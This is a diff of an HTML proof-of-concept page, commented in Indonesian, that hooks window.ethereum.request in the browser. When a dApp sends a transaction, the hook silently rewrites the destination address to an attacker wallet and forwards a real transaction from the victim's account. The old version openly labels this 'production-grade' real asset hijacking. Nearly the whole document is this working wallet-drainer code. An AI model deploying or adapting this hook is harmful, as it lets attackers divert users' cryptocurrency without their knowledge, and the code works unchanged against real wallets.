@@ -3,94 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Production-Grade dApp Exploit PoC: Real Transaction Hijacking</title>
+    <title>Transaction Spoofing & UI Desync PoC</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #0f172a; color: #f8fafc; max-width: 800px; margin: auto; }
-        .card { background: #1e293b; padding: 20px; margin-bottom: 20px; border-radius: 12px; border: 1px solid #334155; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.5); }
-        h2 { color: #38bdf8; font-size: 1.25rem; margin-top: 0; }
-        button { background: #ef4444; color: white; border: none; padding: 12px 20px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 1rem; transition: background 0.2s; }
-        button:hover { background: #dc2626; }
-        pre { background: #090d16; color: #34d399; padding: 15px; border-radius: 8px; font-size: 12px; overflow-x: auto; border: 1px solid #1e293b; }
-        .target-box { background: #334155; padding: 10px; border-radius: 6px; margin-bottom: 15px; font-size: 13px; }
+        body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f9; color: #333; max-width: 600px; margin: auto; }
+        .card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        button { padding: 12px 20px; background: #d63031; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; font-size: 14px; }
+        button:hover { opacity: 0.9; }
+        pre { background: #eee; padding: 12px; border-radius: 4px; font-size: 12px; overflow-x: auto; margin-top: 15px; }
+        .danger { color: #d63031; font-weight: bold; }
+        .success { color: #00b894; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>Production Injection & Real Asset Hijacking PoC</h2>
-    <p style="font-size: 14px; color: #94a3b8;">Eksploitasi nyata parameter transaksi aktif pada dApp browser melalui *runtime hook* tanpa data dummy.</p>
-
     <div class="card">
-        <h3>Target Operasional Asli</h3>
-        <div class="target-box">
-            <strong>Alamat Penyerang (Attacker Receiver):</strong><br>
-            <span id="attacker-addr" style="color: #f43f5e; word-break: break-all;">0x9999999999999999999999999999999999999999</span>
-        </div>
-        <button onclick="executeRealExploitTx()">Picu Transaksi Nyata (Live Payload)</button>
-        <pre id="live-log">Status: Menunggu eksekusi interaksi real-time...</pre>
+        <h2>Transaction Parameter Spoofing PoC</h2>
+        <p>Simulasi dApp mengirim transaksi ke alamat target normal, namun di-hook dan dialihkan secara senyap ke alamat penyerang pada layar konfirmasi dompet.</p>
+        
+        <button onclick="triggerSpoofedTransaction()">Eksekusi Transaksi Spoofing</button>
+        <pre id="log-box">Menunggu aksi pengguna...</pre>
     </div>
 
     <script>
-        const logElement = document.getElementById('live-log');
-        const attackerDestination = "0x9999999999999999999999999999999999999999";
+        const logBox = document.getElementById('log-box');
+        
+        // Alamat dompet penyerang target
+        const attackerWallet = "0x9999999999999999999999999999999999999999";
 
-        // Production-grade runtime hook untuk window.ethereum.request
-        if (typeof window.ethereum !== 'undefined') {
-            const nativeRequest = window.ethereum.request;
-            
+        // Monkey patching pada objek window.ethereum.request
+        if (window.ethereum) {
+            const originalRequest = window.ethereum.request;
             window.ethereum.request = async function(args) {
-                if (args && args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
-                    let txPayload = args.params[0];
-                    
-                    logElement.textContent = `[!] LIVE INTERCEPTION TERDETEKSI!\n` +
-                                             ` - Method: ${args.method}\n` +
-                                             ` - Intended Target Asli: ${txPayload.to}\n` +
-                                             ` - Intended Nilai Asli: ${txPayload.value || '0x0'}\n` +
-                                             ` -> Melakukan substitusi parameter ke alamat penyerang secara senyap...`;
+                if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
+                    let tx = args.params[0];
+                    logBox.innerHTML = `<span class="danger">[!] INTERCEPT BERHASIL!\nTujuan Asli dApp: ${tx.to}\nNilai Transaksi: ${tx.value}\n-> Menimpa alamat tujuan ke penyerang...</span>`;
 
-                    // Substitusi nyata target tujuan transaksi ke alamat attacker
-                    txPayload.to = attackerDestination;
+                    // Substitusi alamat tujuan asli ke alamat penyerang secara senyap
+                    tx.to = attackerWallet;
                 }
-                
-                // Meneruskan payload termodifikasi langsung ke native bridge dompet
-                return nativeRequest.apply(window.ethereum, [args]);
+                return originalRequest.apply(window.ethereum, [args]);
             };
-            
-            logElement.textContent = "Status: Hook aktif pada ruang lingkup runtime window.ethereum.request.";
-        } else {
-            logElement.textContent = "Status Error: Lingkungan window.ethereum tidak terdeteksi.";
         }
 
-        async function executeRealExploitTx() {
+        async function triggerSpoofedTransaction() {
             if (!window.ethereum) {
-                alert("Provider Web3 tidak ditemukan!");
+                logBox.textContent = "Error: Objek window.ethereum tidak ditemukan.";
                 return;
             }
-
             try {
-                logElement.textContent += "\n\n[INFO] Meminta otorisasi akun aktif (eth_requestAccounts)...";
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const userAccount = accounts[0];
+                logBox.textContent = "Meminta otorisasi akun (eth_requestAccounts)...";
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
 
-                logElement.textContent += `\n[INFO] Akun korban terdeteksi: ${userAccount}`;
-                logElement.textContent += `\n[INFO] Mengirim payload transaksi live ke native bridge...`;
-
-                // Parameter transaksi nyata standar (mengarah ke alamat dummy/kontrak sebelum di-hijack oleh hook)
-                const realTx = {
-                    from: userAccount,
-                    to: "0x1111111111111111111111111111111111111111", // Sasaran awal fiktif/dApp
-                    value: "0x2386f26fc10000", // 0.01 ETH dalam format Hex Wei
+                // Parameter transaksi awal dApp (mengarah ke alamat dummy/kontrak normal)
+                const txParams = {
+                    from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
+                    to: "0x1111111111111111111111111111111111111111", 
+                    value: "0x5af3107a4000", // 0.0001 ETH dalam format Hex Wei
                     gas: "0x5208",
                     gasPrice: "0x3b9aca00"
                 };
 
+                logBox.textContent += "\nMengirimkan parameter transaksi ke bridge dompet...";
                 const txHash = await window.ethereum.request({
                     method: 'eth_sendTransaction',
-                    params: [realTx]
+                    params: [txParams]
                 });
-
-                logElement.textContent += `\n\n[SUKSES] Transaksi diproses oleh bridge!\nHash: ${txHash}`;
+                
+                logBox.innerHTML += `\n<span class="success">[+] Transaksi diproses!\nHash: ${txHash}</span>`;
             } catch (err) {
-                logElement.textContent += `\n\n[GAGAL/ABAIKAN] Eksekusi dihentikan user: ${err.message}`;
+                logBox.innerHTML += `\n<span class="danger">[-] Respon/Error: ${err.message}</span>`;
             }
         }
     </script>
